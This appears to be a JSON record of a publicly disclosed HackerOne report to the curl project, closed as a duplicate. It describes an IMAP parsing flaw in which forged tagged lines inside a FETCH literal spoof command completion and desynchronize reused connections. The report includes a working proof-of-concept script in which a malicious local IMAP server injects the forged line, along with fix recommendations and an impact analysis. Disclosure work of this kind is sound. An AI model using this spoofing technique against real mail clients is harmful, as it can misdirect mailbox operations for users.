@@ -1,0 +1,102 @@
+{
+  "id": 4021854,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MDIxODU0",
+  "url": "https://hackerone.com/reports/4021854",
+  "title": "IMAP custom FETCH literals can spoof tagged responses and desynchronize reused connections",
+  "state": "Closed",
+  "substate": "duplicate",
+  "readable_substate": "Duplicate",
+  "created_at": "2026-09-11T14:42:28.611Z",
+  "submitted_at": "2026-09-11T14:42:28.703Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "giant_anteater",
+    "url": "/giant_anteater",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/r9sgcvqgyzx7oyd4vqjv580xuk4y/33193aed4df168c753cb4b15e6d5d8d6ba053ba5ee3e8d1478c137162601abe9"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/dd1dfc8fc7352772e4a8994c07e1d628d34edc74db48377c707f10829dc23d53",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/2a499a0b732abf809ef45635d9ad400431480fafd17452e700cbdba6fd64fe85"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-10-15T07:19:44.347Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-10-15T06:04:19.706Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\n\nThere is an IMAP parser vulnerability, related to a custom `FETCH` whose message set begins with a range or comma, `is_custom_fetch_listing()` causes `imap_state_listsearch_resp()` to skip literal parsing (`lib/imap.c:1233-1235`).\n\nThe generic ping-pong reader nevertheless continues parsing the response as newline-delimited IMAP responses. Consequently, a line inside an attacker-controlled literal that matches curl's current response tag, such as `A004 OK`, is accepted by `imap_endofresp()` as the command completion response.\n\nCurl can therefore report a custom `FETCH` successful even when the server's actual tagged response is `NO`. The declared literal and the genuine response remain buffered. Because this path does not set `data->req.maxdownload`, `imap_done()` does not perform the custom FETCH final-response handling, and the connection can remain reusable with stale protocol data in the IMAP ping-pong buffer.\n\n## Technical details\n\n`is_custom_fetch_listing()` recognizes inputs such as:\n\n```text\nFETCH 1:* (BODY[])\nFETCH 1,2,3 (FLAGS)\nUID FETCH 1:* (BODY[])\n```\n\nWhen the server sends a `FETCH` response containing a literal, the branch at `lib/imap.c:1233-1235` does nothing. `Curl_pp_readresp()` then scans the literal body line by line. `imap_endofresp()` checks for the current tag before distinguishing protocol response boundaries and accepts any line beginning with the tag followed by a space; it only needs the first two status characters to be `OK`.\n\nFor example, the following literal content can terminate command `A004` early:\n\n```text\nX\nA004 OK FORGED-BY-ATTACKER\nTRAILER\n```\n\nThe server's genuine `A004 NO ...` response is left unread or buffered. The same mechanism can leave a forged next-command tag in the buffer, allowing a later command to receive a false completion response.\n\n## Proof of concept\n\nThe following reproducer was tested against audit revision `e5e1c356107ea4f8208757deb69776d94496cfae`.\n\nRun the `exploit` and `control` modes as indicated.\n\n```text\nhttps://github.com/curl/curl.git at e5e1c356107ea4f8208757deb69776d94496cfae\ncheckout: /src\nprivilege required: LOCAL. This was proved by running the built program; no network principal or login is involved.\nrun:      sh /poc-scratch/reproduce.sh exploit\ncontrol (script_mode): sh /poc-scratch/reproduce.sh control\n```\n\n### `pre_run.sh` (run once)\n\n```sh\napt-get update && apt-get install -y --no-install-recommends python3\n```\n\n### `reproduce.sh`\n\n```sh\n#!/bin/sh\n# IMAP literal/protocol desync in curl (lib/imap.c custom FETCH listing branch).\n# Override the loopback port with VF_IMAP_PORT if 14399 is taken.\nMODE=\"$1\"\nPORT=\"${VF_IMAP_PORT:-14399}\"\nWORK=\"$(mktemp -d)\"\n\ncat > \"$WORK/srv.py\" <<'PY'\nimport socket, threading, sys\nPORT=int(sys.argv[1]); MODE=sys.argv[2]\ndef handle(c):\n    f=c.makefile('rwb', buffering=0)\n    def send(s): f.write(s.encode())\n    send(\"* OK IMAP4rev1 ready\\r\\n\")\n    while True:\n        l=f.readline()\n        if not l: break\n        line=l.decode('latin1'); p=line.split()\n        if len(p)<2: continue\n        tag,cmd=p[0],p[1].upper()\n        if cmd==\"CAPABILITY\":\n            send(\"* CAPABILITY IMAP4rev1 \\r\\n\"); send(tag+\" OK done\\r\\n\")\n        elif cmd==\"LOGIN\": send(tag+\" OK done\\r\\n\")\n        elif cmd in (\"SELECT\",\"EXAMINE\"):\n            send(\"* 3 EXISTS\\r\\n* OK [UIDVALIDITY 1]\\r\\n\"); send(tag+\" OK [READ-WRITE] done\\r\\n\")\n        elif cmd==\"FETCH\":\n            # Attacker-controlled literal body. In exploit mode it embeds a line\n            # matching curl's current tag for this command (for example,\n            # A004 OK).\n            if MODE==\"exploit\":\n                body=\"X\\r\\n\"+tag+\" OK FORGED-BY-ATTACKER\\r\\nTRAILER\\r\\n\"\n            else:\n                body=\"X\\r\\nZZZ9 OK HARMLESS-NO-MATCH\\r\\nTRAILER\\r\\n\"\n            send(\"* 1 FETCH (BODY[] {%d}\\r\\n\" % len(body)); send(body)\n            # The server's real verdict: it rejected the fetch.\n            send(tag+\" NO server actually rejected the fetch\\r\\n\")\n        else: send(tag+\" OK done\\r\\n\")\n    try: c.close()\n    except Exception: pass\ns=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)\ns.bind((\"127.0.0.1\",PORT)); s.listen(8)\nwhile True:\n    cc,_=s.accept(); threading.Thread(target=handle,args=(cc,),daemon=True).start()\nPY\n\npython3 \"$WORK/srv.py\" \"$PORT\" \"$MODE\" 2>/dev/null &\nSRV=$!\n\n# Wait until the loopback IMAP server is accepting connections.\ni=0\nwhile ! python3 -c \"import socket,sys; s=socket.socket(); sys.exit(0 if s.connect_ex(('127.0.0.1',$PORT))==0 else 1)\" 2>/dev/null; do\n  i=$((i+1)); [ \"$i\" -gt 50 ] && { echo \"server-not-ready\"; kill -9 $SRV 2>/dev/null; exit 3; }\n  sleep 0.2\ndone\n\n# Everything is up and the shipped curl is about to run: signal readiness.\n: > \"${VF_READY:-/dev/null}\"\n\n# Exercise the shipped curl binary exactly once. Its exit code is the observable:\n# 0  => curl believed the custom FETCH succeeded (spoofed by the literal)\n# !0 => curl honored the server's real \"NO\" rejection.\ntimeout 30 curl -s --url \"imap://127.0.0.1:$PORT/INBOX\" -u user:pass -X \"FETCH 1:* (BODY[])\" >/dev/null 2>&1\nrc=$?\n\nkill -9 $SRV 2>/dev/null\necho \"CURL_EXIT=$rc\"\nexit \"$rc\"\n```\n\nExpected result:\n\n- `exploit`: curl exits `0`.\n- `control`: curl exits nonzero.\n\n## Recommendation\n\nDo not classify custom `FETCH` as line-only based solely on its message-set syntax. Every `FETCH` response should parse and consume literals by their declared byte length before recognizing response lines.\n\nIf arbitrary multi-literal custom `FETCH` responses are not supported, reject them or mark the connection non-reusable as soon as an unconsumed literal is detected. Add regression tests containing current and subsequent command tags inside literals, including tests that reuse the connection for a later `SELECT`, `FETCH`, `STORE`, or `EXPUNGE`.\n\n## Impact\n\nThe direct impact is response desynchronization and false command status, not arbitrary command injection. On a reused connection, leftover literal or response bytes can be consumed as the response to a later command.\n\nA security-relevant consumer scenario is cross-mailbox confusion: an application could fetch attacker-controlled content from mailbox A, then select mailbox B and perform a sensitive operation. A forged tagged line left in the connection buffer could make curl believe the `SELECT B` succeeded when it did not, causing the following operation to execute against the server's still-selected mailbox A while the application believes it is operating on B.\n\nThis requires all of the following:\n\n- the application uses the affected custom range/comma `FETCH` form;\n- the IMAP connection is reused for a later command;\n- an attacker can control literal content, or the server is malicious;\n- the consuming application treats curl's command result as security-relevant.\n\nA malicious IMAP server can already lie about its own response, so a one-shot request to a malicious server does not by itself demonstrate an additional privilege escalation. The distinct issue is that literal data from an otherwise honest server can cross into the command-response state machine and contaminate later operations.",
+  "original_report_id": 3971538,
+  "original_report_url": "https://hackerone.com/reports/3971538",
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 0,
+  "voters": [],
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
